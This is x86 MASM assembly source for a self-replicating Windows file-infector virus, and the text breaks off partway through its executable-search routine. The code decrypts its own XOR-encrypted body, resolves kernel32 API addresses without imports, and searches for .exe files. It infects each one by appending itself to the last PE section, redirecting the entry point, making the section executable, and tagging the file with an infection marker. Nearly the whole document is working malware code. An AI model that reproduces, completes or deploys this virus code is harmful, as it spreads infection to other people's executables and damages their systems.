.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc;comment
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc

includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib

.code

LABEL_START:
	call LABEL_DELTA
LABEL_DELTA:
	pop edi
	sub edi,offset LABEL_DELTA;delta offset in edi
	jmp LABEL_MAIN
;-----------------------------------------------------------
;in-WINAPI 
;	address,size,key address,key size
;-----------------------------------------------------------
Crypt proc
	push ebp
	mov ebp,esp
	pushad
	pushfd

	mov esi,dword ptr[ebp+8];address
	mov edx,dword ptr[ebp+0Ch];size
	mov edi,dword ptr[ebp+10h];key address
	mov ebx,dword ptr[ebp+14h];key size

	mov ecx,0
	LABEL_Crypt_cryptLoopBegin:
	cmp ecx,edx;cmp size
	jz LABEL_Crypt_cryptLoopEnd

	push edx	;TODO - is it really necessary? edx val is meaningless
	mov eax,ecx	;TODO lea eax, [ecx]
	mov edx,0	;TODO - is it necessary?
	div ebx;in edx - eax%keysize

	mov al,byte ptr [edi+edx]
	mov dl,byte ptr [esi+ecx]
	xor al,dl
	mov byte ptr [esi+ecx],al ; TODO - xor byte ptr [esi+ecx],al

	inc ecx;position 
	pop edx
	jmp LABEL_Crypt_cryptLoopBegin
	LABEL_Crypt_cryptLoopEnd:

	popfd
	popad
	mov esp,ebp
	pop ebp

	push eax	;saving eax value
	mov eax,dword ptr [esp+4];ret address
	mov dword ptr [esp+14h],eax
	pop eax
	add esp,10h;esp on ret address

	ret
Crypt endp

;----------------------------------------------------------------------------------------
;calling convention:WINAPI                                                                 
;in                                                                                        
;	file handle 8,message_address C,message_size 10,key 14,key_size 18
;----------------------------------------------------------------------------------------
;TODO in must be filepath?
;TODO FileCrypt must be inside crypto_markers to encrypt it
FileCrypt proc
	push ebp
	mov ebp,esp
	pushad
	pushfd

	mov eax,dword ptr [ebp+18h];key size
	add eax,4;NumberOfBytesRead
	push eax
	mov eax,LPTR	;TODO - push LPTR?
	push eax
	call [edi+_LocalAlloc]
	push eax;mem ptr in stack

	mov eax,dword ptr[ebp+10h]	;buffer_size
	mov ebx,dword ptr[ebp+18h]	;key size
	mov edx,0
	div ebx; eax - (keysizeblocks_amount-1); edx - additional_bytes_amount
	mov ecx,eax
	inc ecx;full amount of blocks (all full and 1 not full)
	
	mov eax, dword ptr[ebp+0Ch];message address

	push ecx
	push edx

	push FILE_BEGIN
	push NULL	;TODO its no always NULL
	push eax
	mov eax,dword ptr [ebp+8];file handle
	push eax
	call [edi+_SetFilePointer];file pointer on message address ; file position in eax

	pop edx
	pop ecx

	;ecx - full amount of blocks
	LABEL_FileCrypt_cryptLoopBegin:
	cmp ecx,0						;TODO optimize?
	jz LABEL_FileCrypt_cryptLoopEnd
	cmp ecx,1						;TODO optimize?
	jnz LABEL_FileCrypt_NotLastBlock
	mov ebx,edx;size
	LABEL_FileCrypt_NotLastBlock:
	push ecx
	push edx;amount of bytes of not full block in stack
	push eax;message pointer in stack

	mov eax, dword ptr [esp+0Ch];mem ptr
	add eax,ebx;key size
	push NULL
	push eax
	sub eax, ebx
	push ebx
	push eax
	mov eax,dword ptr [ebp+8];file handle
	push eax
	call [edi+_ReadFile];block of key size in memory

	mov eax,dword ptr[esp];message pointer

	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [ebp+8];file handle
	push eax
	call [edi+_SetFilePointer];file pointer returned; position in file in eax

	push ebx;CURRENT key size
	mov eax,dword ptr [ebp+14h];key addr
	push eax
	push ebx;CURRENT key size
	mov eax,dword ptr [esp+18h];mem ptr
	push eax
	call Crypt
	;now in memory crypted block

	mov eax,dword ptr[esp+0Ch];mem ptr
	add eax,ebx
	push NULL
	push eax
	sub eax, ebx
	push ebx
	push eax
	mov eax,dword ptr [ebp+8];file handle
	push eax
	call [edi+_WriteFile];writing crypted in file

	pop eax;message pointer in eax
	add eax,ebx
	pop edx
	pop ecx
	dec ecx

	jmp LABEL_FileCrypt_cryptLoopBegin
	LABEL_FileCrypt_cryptLoopEnd:

	call [edi+_LocalFree]

	popfd
	popad

	mov esp,ebp
	pop ebp

	push eax;stack clining
	mov eax,dword ptr [esp+4];ret address
	mov dword ptr [esp+18h],eax
	pop eax
	add esp,14h;esp on ret address

	ret
FileCrypt endp

;----------------------------------------------------------------------------------------
LABEL_MAIN:
;Decrypt main body
	push 4;key size
	mov eax,offset key
	add eax,edi
	push eax;key address
	mov eax,offset ending_crypto
	sub eax,offset LABEL_MAIN_cryptoBodyBegin
	push eax;size
	mov eax,offset LABEL_MAIN_cryptoBodyBegin
	add eax,edi
	push eax;address
	call Crypt;decrypt

	jmp LABEL_MAIN_cryptoBodyBegin

cryptmarker_begin BYTE 0DEh,0ADh,0BEh,0EFh, 0FEh,0EDh,0FAh,0CEh

LABEL_MAIN_cryptoBodyBegin:
	;Acquire WinAPI proc addresses
	;Get kernel32 base addr
	mov esi,dword ptr [esp];esp-return to kernel
	call GetPEImageBase
	
	;TODO Rework GetGetProcAddress -> GetProcAddr to get addr of arbitrary proc
	push esi
	call GetGetProcAddress; GetProcAddress address in eax

	mov dword ptr [edi + offset _GetProcAddress],esi

	mov ebx,offset CreateFileA_
	add ebx, edi
	push ebx
	mov ebx,dword ptr [esp+4];kernel32.dll base
	push ebx
	call esi
	mov dword ptr [edi+offset _CreateFileA],eax

	mov ebx,offset ReadFile_
	add ebx, edi
	push ebx
	mov ebx,dword ptr [esp+4]
	push ebx
	call esi
	mov dword ptr [edi+offset _ReadFile],eax

	mov ebx,offset SetFilePointer_
	add ebx, edi
	push ebx
	mov ebx,dword ptr [esp+4]
	push ebx
	call esi
	mov dword ptr [edi+offset _SetFilePointer],eax

	mov ebx,offset WriteFile_
	add ebx, edi
	push ebx
	mov ebx,dword ptr [esp+4]
	push ebx
	call esi
	mov dword ptr [edi+offset _WriteFile],eax

	mov ebx,offset CloseHandle_
	add ebx, edi
	push ebx
	mov ebx,dword ptr [esp+4]
	push ebx
	call esi
	mov dword ptr [edi+offset _CloseHandle],eax

	mov ebx,offset LocalAlloc_
	add ebx, edi
	push ebx
	mov ebx,dword ptr [esp+4]
	push ebx
	call esi
	mov dword ptr [edi+offset _LocalAlloc],eax

	mov ebx,offset LocalFree_
	add ebx, edi
	push ebx
	mov ebx,dword ptr [esp+4]
	push ebx
	call esi
	mov dword ptr [edi+offset _LocalFree],eax

	mov ebx,offset FindFirstFileA_
	add ebx, edi
	push ebx
	mov ebx,dword ptr [esp+4]
	push ebx
	call esi
	mov dword ptr [edi+offset _FindFirstFileA],eax

	mov ebx,offset FindNextFileA_
	add ebx, edi
	push ebx
	mov ebx,dword ptr [esp+4]
	push ebx
	call esi
	mov dword ptr [edi+offset _FindNextFileA],eax

	mov ebx,offset GetLastError_
	add ebx, edi
	push ebx
	mov ebx,dword ptr [esp+4]
	push ebx
	call esi
	mov dword ptr [edi+offset _GetLastError],eax

	;Search and infect other victims
	;TODO - SearchEXE should only search, not infect
	pop esi
	mov esi,edi
	add esi,offset path
	call SearchEXE

	;TODO - Payload?

	;Redirect execution to original entry point
	mov eax, offset LABEL_START
	add eax,edi;lea eax,[edi+offset LABEL_START]
	push ebx;TODO - ebx value is valueless
	mov ebx, dword ptr [edi+offset my_entry_point]
	sub eax,ebx;image base
	mov ebx, dword ptr [edi+offset entry_point]
	add eax,ebx
	pop ebx
	jmp eax

;----------------------------------------------------------------------------------------
;in
;	esi: exe ASCIIZ path
;----------------------------------------------------------------------------------------
Infect proc
	pushad
	pushfd

	push NULL
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push NULL
	mov eax, FILE_SHARE_READ
	or eax,FILE_SHARE_WRITE
	push eax
	mov eax, GENERIC_READ
	or eax, GENERIC_WRITE
	push eax
	push esi
	call [edi+ offset _CreateFileA]

	push eax; file handle in stack

	mov eax,8
	push eax
	push LPTR
	call [edi+ offset _LocalAlloc];need to call LocalFree

	push eax;memory pointer in stack 

	mov eax,dword ptr [esp+4] ;hFile
	push FILE_BEGIN
	push NULL
	push 3Ch
	push eax
	call [edi+ offset _SetFilePointer];file pointer on e_lfanew

	mov eax,dword ptr [esp] ;hFile

	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+14h]
	push eax
	call [edi+ offset _ReadFile];now offset of PE signature in memory

	mov eax,dword ptr [esp]
	mov ebx,dword ptr[eax]

	push ebx;saving PE signature offset in stack

	;Write VV signature
	push FILE_BEGIN
	push NULL
	add ebx,4Ch;Reserved1 offset
	push ebx
	mov ebx, dword ptr [esp+14h]
	push ebx
	call [edi+ offset _SetFilePointer];now file pointer on Reserved1 field
	mov eax,dword ptr[esp+4]
	mov dword ptr[eax],0ABCDDCBAh
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+18h]
	push eax
	call [edi+ offset _WriteFile];writing signature

	push FILE_BEGIN
	push NULL
	mov eax,[esp+8]
	add eax,6
	push eax
	mov eax, dword ptr [esp+14h]
	push eax
	call [edi+ offset _SetFilePointer];file pointer on NumberOfSections field

	push NULL
	mov eax,dword ptr [esp+8]
	add eax,4
	push eax
	sub eax,4
	push 2
	push eax
	mov eax, [esp+18h]
	push eax
	call [edi+ offset _ReadFile]; NumberOfSections in memory

	mov eax, dword ptr [esp+4]
	mov ebx,0
	mov bx, word ptr [eax]

	push ebx;NumberOfSections in stack

	mov eax, dword ptr [esp+4]
	add eax,14h;offset of SizeOfOptionalHeader in eax
	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [esp+18h]
	push eax
	call [edi+ offset _SetFilePointer];file pointer on SizeOfOptionalHeader

	push NULL
	mov eax,dword ptr [esp+0Ch]
	add eax,4
	push eax
	sub eax,4
	push 2
	push eax
	mov eax, dword ptr [esp+1Ch]
	push eax
	call [edi+ offset _ReadFile];reading SizeOfOptionalHeader

	pop ecx;NumberOfSections

	call Incubation;finding last section field
	mov ecx,eax

	mov eax,0
	loop1:;mul eax,28h
	cmp ecx,0
	jz end_loop1
	add eax,28h
	dec ecx
	jmp loop1
	end_loop1:

	mov ebx, dword ptr [esp]
	add eax, ebx;adding PE signature offset
	mov ebx, dword ptr [esp+4];memory ptr
	mov ecx,dword ptr [ebx];SizeOfOptionalHeader
	and ecx,0FFFFh
	add eax, ecx
	add eax,18h;size of PE signature and _IMAGE_FILE_HEADER

	push eax;offset of last section field in stack

	;**************entry point************************
	add eax, 0Ch;VirtualAddress
	push FILE_BEGIN
	push NULL
	push eax
	mov eax, dword ptr [esp+18h]
	push eax
	call [edi+offset _SetFilePointer];file pointer on VirtualAddress of last section field

	mov eax,dword ptr[esp+8]
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+1Ch]
	push eax
	call [edi+offset _ReadFile];reading VirtualAddress of last section of last section field

	mov eax, dword ptr [esp+08h]
	mov ebx,dword ptr [eax]

	push ebx;VirtualAddress in stack

	push FILE_END
	push NULL
	push 0
	mov eax, dword ptr [esp+1Ch]
	push eax
	call [edi+offset _SetFilePointer];file pointer on 1st byte after end of file

	push eax; size of file in stack

	mov eax, dword ptr [esp+8];last section 
	add eax,14h;PointerToRawData
	push FILE_BEGIN
	push NULL
	push eax
	mov eax, dword ptr [esp+20h]
	push eax
	call [edi+offset _SetFilePointer];file pointer on PointerToRawData of last section

	mov eax,dword ptr[esp+10h]
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+24h]
	push eax
	call [edi+offset _ReadFile];reading PointerToRawData of last section

	mov ebx,dword ptr[esp+10h]
	mov eax, dword ptr [ebx]

	pop ebx;size of file
	sub ebx,eax;raw size size of last section + overlay

	pop eax;VirtualAddress in eax

	add eax,ebx;real entry point in eax

	mov ebx,dword ptr [edi+ offset my_entry_point]
	push ebx;my_entry_point in stack
	mov dword ptr [edi+ offset my_entry_point],eax

	mov ebx,dword ptr [edi+ offset entry_point]
	push ebx;entry point of parent gen in stack
	mov dword ptr [edi+ offset entry_point],eax

	mov eax,dword ptr [esp+0Ch]
	add eax,28h;offset of AddressOfEntryPoint
	push FILE_BEGIN
	push NULL
	push eax
	mov eax, dword ptr [esp+20h]
	push eax
	call [edi+offset _SetFilePointer];file pointer on AddressOfEntryPoint

	mov eax,dword ptr[esp+10h]
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+24h]
	push eax
	call [edi+offset _ReadFile];reading ex entry point

	mov eax,dword ptr [esp+10h]
	mov ebx,dword ptr[eax];ex entry point
	mov ecx, [edi+offset entry_point];real entry point
	mov dword ptr [eax+4],ecx
	mov ecx,dword ptr [eax]
	mov [edi+offset entry_point],ecx;ex entry point in entry_point

	mov eax,dword ptr [esp+0Ch]
	add eax,28h;offset of AddressOfEntryPoint
	push FILE_BEGIN
	push NULL
	push eax
	mov eax, dword ptr [esp+20h]
	push eax
	call [edi+offset _SetFilePointer];file pointer on AddressOfEntryPoint

	mov eax,dword ptr [esp+10h]
	push NULL
	push eax
	add eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+24h]
	push eax
	call [edi+offset _WriteFile]
	;**************entry point************************

	;****************************Characteristics********************************
	push FILE_BEGIN
	push NULL
	add eax,24h;Characteristics
	push eax
	mov eax,dword ptr [esp+20h]
	push eax
	call [edi+ offset _SetFilePointer];file pointer on Characteristics

	push NULL
	mov eax,dword ptr[esp+14h]
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr[esp+24h]
	push eax
	call [edi+ offset _ReadFile];reading Characteristics 

	mov ebx, IMAGE_SCN_MEM_WRITE
	or ebx, IMAGE_SCN_MEM_EXECUTE
	or ebx, IMAGE_SCN_MEM_READ
	or ebx, IMAGE_SCN_CNT_CODE;Characteristics in ebx

	mov eax, dword ptr [esp+10h]
	mov ecx, dword ptr [eax]
	or ebx,ecx;final characteristics

	mov dword ptr [eax],ebx

	mov eax,dword ptr [esp+8]
	push FILE_BEGIN
	push NULL
	add eax,24h;Characteristics
	push eax
	mov eax,dword ptr [esp+20h]
	push eax
	call [edi+ offset _SetFilePointer];file pointer on Characteristics

	mov eax, dword ptr [esp+10h]

	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,[esp+24h]
	push eax
	call [edi+ offset _WriteFile];writing characteristics
	;***************Characteristics**************************

	;Inject body in target
	;Inject right to the end
	push FILE_END
	push NULL
	push 0
	mov eax,dword ptr [esp+20h]
	push eax
	call [edi+ _SetFilePointer];file pointer on end of file

	mov ecx,offset LABEL_MAIN_cryptoBodyBegin
	sub ecx,offset LABEL_START; size of decryptor in ecx
	add eax,ecx
	push eax;size of file + size of decryptor in stack

	mov eax,offset ending
	sub eax,offset LABEL_START;body size in eax

	mov ecx, dword ptr [esp+14h]
	add ecx,4

	push NULL
	push ecx
	push eax
	mov eax,offset LABEL_START
	add eax,edi
	push eax
	mov eax,[esp+28h]
	push eax
	call [edi+ offset _WriteFile];writing code 

	;Creating key
	mov eax,dword ptr[esp+0Ch];offset of last section field
	add eax, 14h;PointerToRawData

	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [esp+24h]
	push eax
	call [edi+ _SetFilePointer];filepointer on PointerToRawData

	mov ecx, dword ptr [esp+14h]
	add ecx,4
	push NULL
	push ecx
	sub ecx,4
	push 4
	push ecx
	mov eax,[esp+28h]
	push eax
	call [edi+ offset _ReadFile];reading PointerToRawData 

	mov ecx,dword ptr [esp+14h]
	mov eax, dword ptr [ecx];PointerToRawData in eax

	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [esp+24h]
	push eax
	call [edi+ _SetFilePointer];filepointer on last section

	mov ecx, dword ptr [esp+14h]
	add ecx,4
	push NULL
	push ecx
	sub ecx,4
	push 4
	push ecx
	mov eax,[esp+28h]
	push eax
	call [edi+ offset _ReadFile];reading 4 bytes in beginning of last section

	mov ecx,dword ptr [esp+14h]
	mov eax, dword ptr [ecx];4 bytes in beginning of last section in eax
	;now key 4 bytes size in eax

	mov ecx,dword ptr [edi+offset key]
	push ecx;old key on stack
	mov dword ptr [edi+offset key],eax;new key (size: 4)

	;Encrypting main body
	push 4;key size
	mov eax,offset key
	add eax,edi
	push eax
	mov eax, offset ending_crypto
	sub eax,offset LABEL_MAIN_cryptoBodyBegin;size to crypt
	push eax
	mov eax,dword ptr [esp+10h];size of file + size of decryptor in eax
	push eax
	
	mov eax,dword ptr [esp+2Ch];file handle
	push eax
	call FileCrypt
	;Pass crypto marker
	mov eax,[esp+1Ch] ;file handle
	push FILE_CURRENT
	push NULL
	push 8 ; size of crypto marker
	push eax
	call [edi+ offset _SetFilePointer]

	;Store key
	mov eax,dword ptr [esp+18h];mem ptr
	push NULL
	push eax
	push 4
	mov eax,offset key
	add eax,edi
	push eax
	mov eax,[esp+2Ch];file handle
	push eax
	call [edi+ offset _WriteFile] ;BOOL WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

	;***********************Code Injecting**************************
	pop eax;;size of file + size of decryptor in stack

	pop eax
	mov dword ptr [edi+offset key],eax;old key ressurection ;TODO - For what? Its not used later

	pop eax
	mov dword ptr [edi+ offset entry_point],eax;parent entry point ressurection

	pop eax
	mov dword ptr [edi+ offset my_entry_point],eax;parent my_entry_point ressurection

	;************************File Alignment*************************
	mov ebx,offset ending
	sub ebx,offset LABEL_START; size of code 
	mov ecx,0
	file_alignment_label:
	cmp ebx, 200h
	jl end_file_alignment_label
	sub ebx,200h
	inc ecx
	jmp file_alignment_label 
	end_file_alignment_label:
	inc ecx
	mov ebx,0
	mul_loop:
	cmp ecx,0
	jz end_mul_loop
	dec ecx
	add ebx,200h
	jmp mul_loop
	end_mul_loop:
	;size aligned by FileAlignment in ebx

	mov eax,offset ending
	sub eax,offset LABEL_START; size of code 
	mov ecx,ebx
	sub ecx,eax;amount of zeros to align in ecx
	mov eax,dword ptr [esp+8];memory ptr
	mov edx,0
	mov dword ptr [eax],edx;fill with zeros

	add_zeros_label:
	cmp ecx,0
	jz end_add_zeros_label
	push ecx
	push eax
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 1
	push eax
	mov eax,[esp+24h]
	push eax
	call [edi+ offset _WriteFile]
	pop eax
	pop ecx
	dec ecx
	jmp add_zeros_label
	end_add_zeros_label:
	;now file aligned

	push FILE_BEGIN
	push NULL
	mov eax,dword ptr [esp+08h];last section offset
	add eax,14h;PointerToRawData
	push eax
	mov eax,dword ptr [esp+18h]
	push eax
	call [edi+ _SetFilePointer]; file pointer on PointerToRawData

	mov eax,dword ptr [esp+08h]
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax, dword ptr [esp+1Ch]
	push eax
	call [edi+ offset _ReadFile];reading PointerToRawData

	push FILE_END
	push NULL
	push 0
	mov eax,dword ptr [esp+18h]
	push eax
	call [edi+ _SetFilePointer]; file pointer on end of file, size of file in eax

	mov ecx,dword ptr [esp+8];mem ptr
	mov ebx,dword ptr [ecx];PointerToRawData in ebx
	sub eax,ebx

	mov dword ptr [ecx],eax;real SizeOfRawData

	push FILE_BEGIN
	push NULL
	mov eax,dword ptr [esp+8];last section offset
	add eax,10h;size of raw data
	push eax
	mov eax,dword ptr [esp+18h]
	push eax
	call [edi+ _SetFilePointer];file pointer on SizeOfRawData

	mov ecx,dword ptr [esp+8]
	push NULL
	add ecx,4
	push ecx
	sub ecx,4
	push 4
	push ecx
	mov eax,[esp+1Ch]
	push eax
	call [edi+ offset _WriteFile];writing real SizeOfRawData
	;************************File Alignment*************************

	;************************Section Alignment**********************
	int 3h

	push FILE_BEGIN
	push NULL
	mov eax,dword ptr [esp+8];last section offset
	add eax,10h; to _IMAGE_SECTION_HEADER.SizeOfRawData
	push eax
	mov eax,dword ptr [esp+18h]
	push eax
	call [edi+ _SetFilePointer];file pointer on SizeOfRawData

	push NULL							;lpOverlapped
	mov eax,dword ptr [esp+0Ch]
	add eax,4
	push eax							;lpNumberOfBytesRead
	sub eax,4
	push 4								;nNumberOfBytesToRead
	push eax							;lpBuffer
	mov eax, dword ptr [esp+1Ch]
	push eax							;hFile
	call [edi+ offset _ReadFile];reading SizeOfRawData

	mov eax,dword ptr[esp+8]
	mov ebx,dword ptr[eax]
	mov ecx,0

	section_align_label1:
	cmp ebx,1000h
	jl end_section_align_label1
	inc ecx
	sub ebx,1000h
	jmp section_align_label1
	end_section_align_label1:
	inc ecx
	mov ebx,0
	section_align_label2:
	cmp ecx,0
	jz end_section_align_label2
	dec ecx
	add ebx,1000h
	jmp section_align_label2
	end_section_align_label2:
	;in ebx aligned SizeOfRawData

	push ebx;aligned SizeOfRawData in stack

	mov eax,dword ptr[esp+4]
	add eax,8
	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [esp+1Ch]
	push eax
	call [edi+offset _SetFilePointer];file pointer on VirtualSize

	mov eax,dword ptr [esp+0Ch]
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+20h]
	push eax
	call [edi+offset _ReadFile];reading VirtualSize

	mov eax,dword ptr [esp+0Ch]
	mov edx,dword ptr[eax]
	mov ecx,0

	section_align_label3:
	cmp edx,1000h
	jl end_section_align_label3 ; TODO ja jb ?
	inc ecx
	sub edx,1000h
	jmp section_align_label3
	end_section_align_label3:
	inc ecx ;TODO if edx != 0
	mov edx,0
	section_align_label4:
	cmp ecx,0
	jz end_section_align_label4
	dec ecx
	add edx,1000h
	jmp section_align_label4
	end_section_align_label4:
	;in edx aligned VirtualSize

	mov ebx,dword ptr[esp]
	sub ebx,edx; (aligned_SizeOfRawData - aligned_section_VirtualSize); in ebx value which need to add to ImageSize

	mov eax,dword ptr[esp+8];PE signature offset
	add eax,50h;SizeOfImage 
	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [esp+1Ch]
	push eax
	call [edi+offset _SetFilePointer];file pointer on SizeOfImage

	mov eax,dword ptr [esp+0Ch]
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+20h]
	push eax
	call [edi+offset _ReadFile];reading SizeOfImage

	mov eax, dword ptr [esp+0Ch]
	mov ecx,dword ptr [eax];in ecx old SizeOfImage
	add ebx,ecx;real SizeOfImage
	mov dword ptr [eax],ebx

	mov eax,dword ptr[esp+8];PE signature offset
	add eax,50h;SizeOfImage 
	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [esp+1Ch]
	push eax
	call [edi+offset _SetFilePointer];file pointer on SizeOfImage

	mov ecx,dword ptr [esp+0Ch]
	push NULL
	add ecx,4
	push ecx
	sub ecx,4
	push 4
	push ecx
	mov eax,[esp+20h]
	push eax
	call [edi+ offset _WriteFile];writing real SizeOfImage

	pop ebx; aligned SizeOfRawData in stack
	mov eax, dword ptr [esp+8]
	mov dword ptr [eax],ebx

	mov eax,dword ptr[esp]
	add eax,8
	push FILE_BEGIN
	push NULL
	push eax
	mov eax, dword ptr[esp+18h]
	push eax
	call [edi+offset _SetFilePointer];file pointer on VirtualSize

	mov ecx,dword ptr [esp+8h]
	push NULL
	add ecx,4
	push ecx
	sub ecx,4
	push 4
	push ecx
	mov eax,[esp+1Ch]
	push eax
	call [edi+ offset _WriteFile];writing real VirtualSize
	;************************Section Alignment**********************
	add esp,8

	call [edi+offset _LocalFree]
	call [edi+offset _CloseHandle]
	popfd
	popad
	ret
Infect endp

;+
;----------------------------------------------------------------------------------------
;in
;	esi-pointer to 1st asciiz str
;	edx-pointer to 2nd asciiz str ;TODO - why edx and not edi
;out
;	eax-1:true;0:false
;----------------------------------------------------------------------------------------
StrCMP proc
	pushf
	push ebx
	mov eax,0
	LABEL_StrCMP_loopBegin:
	mov bl,byte ptr[esi+eax]
	cmp bl,byte ptr[edx+eax]
	jnz LABEL_StrCMP_notEqual
	cmp bl,0
	jz LABEL_StrCMP_equal
	inc eax
	jmp LABEL_StrCMP_loopBegin
	LABEL_StrCMP_notEqual:
	mov eax,0
	jmp LABEL_StrCMP_finish
	LABEL_StrCMP_equal:
	mov eax,1
	LABEL_StrCMP_finish:
	pop ebx
	popf
	ret
StrCMP endp

;+
;----------------------------------------------------------------------------------------
;in
;	esi-pointer to asciiz string
;out 
;	eax-string length 
;----------------------------------------------------------------------------------------
StrLen proc
	mov eax,0
	LABEL_StrLen_loopBegin:
	cmp byte ptr [esi+eax],0
	jz LABEL_StrLen_exit
	inc eax
	jmp LABEL_StrLen_loopBegin
	LABEL_StrLen_exit:
	ret
StrLen endp

;+
;----------------------------------------------------------------------------------------
;in
;	esi-address of file in memory
;out
;	eax-1:file is PE;0-file is not PE 
;----------------------------------------------------------------------------------------
IsPE proc
    pushf
    push esi
    cmp word ptr [esi],"ZM"
    jnz LABEL_IsPE_notPE
	add esi,dword ptr [esi+3Ch];address of 'PE' signature
	cmp dword ptr [esi], "EP"	;TODO - really dword
	jnz LABEL_IsPE_notPE
	mov eax,1
    jmp LABEL_IsPE_exit
    LABEL_IsPE_notPE:
    mov eax,0
	LABEL_IsPE_exit:
    pop esi
	popf
	ret
IsPE endp

;+
;----------------------------------------------------------------------------------------
;in 
;	esi: address somewhere in PE
;out
;	PE image base addr
;----------------------------------------------------------------------------------------
GetPEImageBase proc
	pushf
	and esi,0FFFF0000h
	push eax
	LABEL_GetPEImageBase_nextRegion:
	call IsPE
	cmp eax,1	;TODO - optimize
	jz LABEL_GetPEImageBase_exit
	sub esi,10000h
	jmp LABEL_GetPEImageBase_nextRegion
	LABEL_GetPEImageBase_exit:
	pop eax
	popf
	retn
GetPEImageBase endp

;----------------------------------------------------------------------------------------
;in
;	esi-kernel32.dll base
;out
;	esi-address of GetProcAddress
;----------------------------------------------------------------------------------------
GetGetProcAddress proc
	pushf
	push edi
	push ecx
	push eax

	mov edi,esi
	
	add esi,[esi+3Ch] ;PE header addr
	add esi,78h; to IMAGE_DIRECTORY_ENTRY_EXPORT.VirtualAddress
	mov esi,[esi]
	add esi,edi
	mov  ecx,esi
	
	mov esi,[esi+20h] ;to _IMAGE_EXPORT_DIRECTORY.AddressOfNames
	add esi,edi
	;mov esi,[esi]
	;add esi,edi

	mov eax,0;as index
	push ebx
	mov ebx, esi
	mov esi,dword ptr [esp+0Ch];delta offset
	add esi, offset GetProcAddress_
	push edx
	LABEL_GetGetProcAddress_loopBegin:
	mov edx,[ebx+eax*4]
	add edx,edi
	push eax
	call StrCMP
	cmp eax,0
	jnz LABEL_GetGetProcAddress_indexFound
	pop eax
	inc eax
	jmp LABEL_GetGetProcAddress_loopBegin
	LABEL_GetGetProcAddress_indexFound:
	pop eax;index here
	pop edx
	pop ebx
	mov esi, ecx
	mov esi,[esi+24h];now ordinal
	add esi,edi
	add eax,eax
	mov esi,[esi+eax]
	push eax
	mov eax,ecx
	;sub esi,dword ptr [eax+10h];index of function in address array
	pop eax
	and esi,0FFFFh
	push esi
	mov esi,ecx
	mov eax,[esi+1Ch]
	pop esi
	add eax, edi
	mov esi,[eax+esi*4]
	add esi,edi
	
	pop eax
	pop ecx
	pop edi
	popf
	ret
GetGetProcAddress endp

;---------------------------------------------------------------------------------------
;in
;	esi-asciiz path address 
;out
;	eax:1-infected;0-not infected;-2 - error 
;---------------------------------------------------------------------------------------
IsInfected proc
	pushfd
	push NULL
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push NULL
	push 0
	push GENERIC_READ
	push esi
	call [edi+offset _CreateFileA]

	cmp eax, INVALID_HANDLE_VALUE
	jz error

	push eax;file handle in stack

	push FILE_BEGIN
	push NULL
	push 3Ch
	push eax
	call [edi+offset _SetFilePointer]

	push 8
	push LPTR
	call [edi+offset _LocalAlloc]

	push eax;pointer to memory in stack

	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax, dword ptr [esp+14h]
	push eax
	call [edi+offset _ReadFile]

	mov ebx,dword ptr [esp]
	mov eax,dword ptr [ebx];pointer to PE header
	add eax,4Ch;pointer to field 'Reserved1'

	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [esp+10h]
	push eax
	call [edi+offset _SetFilePointer]

	mov eax,dword ptr [esp]
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+14h]
	push eax
	call [edi+offset _ReadFile]

	mov eax,dword ptr [esp+4]
	push eax;handle in eax
	call [edi+offset _CloseHandle]

	mov ebx,dword ptr [esp]
	mov eax,dword ptr [ebx]

	push eax

	push ebx
	call [edi+offset _LocalFree]

	pop eax

	cmp eax,0ABCDDCBAh	;TODO place signature value in var
	jz inf_label

	add esp,8
	popfd
	mov eax,0
	ret

	inf_label:
	add esp,8
	popfd
	mov eax,1
	ret

	error:
	mov eax,2
	popfd
	ret
IsInfected endp

;-----------------------------------------------------------------------------------------------
;in
;	esi-pointer to asciiz string 
;-----------------------------------------------------------------------------------------------
SearchEXE proc
	LOCAL w32fd:WIN32_FIND_DATA ;TODO it can be just allocated memory block
	pushad
	pushfd

	call StrLen

	add eax,7;length of "\*.exe" and 0
	push eax
	push LPTR
	call [edi+offset _LocalAlloc]

	mov ecx,0
	LABEL_SearchEXE_copyPathLoopBegin:;copying path into allocated mem block
	cmp byte ptr [esi+ecx],0
	jz LABEL_SearchEXE_copyPathLoopEnd
	mov bl, byte ptr [esi+ecx]
	mov byte ptr [eax+ecx], bl
	inc ecx
	jmp LABEL_SearchEXE_copyPathLoopBegin 
	LABEL_SearchEXE_copyPathLoopEnd:
	mov word ptr [eax+ecx], '*\'
	add ecx,2
	mov dword ptr [eax+ecx], 'exe.'
	add ecx,4
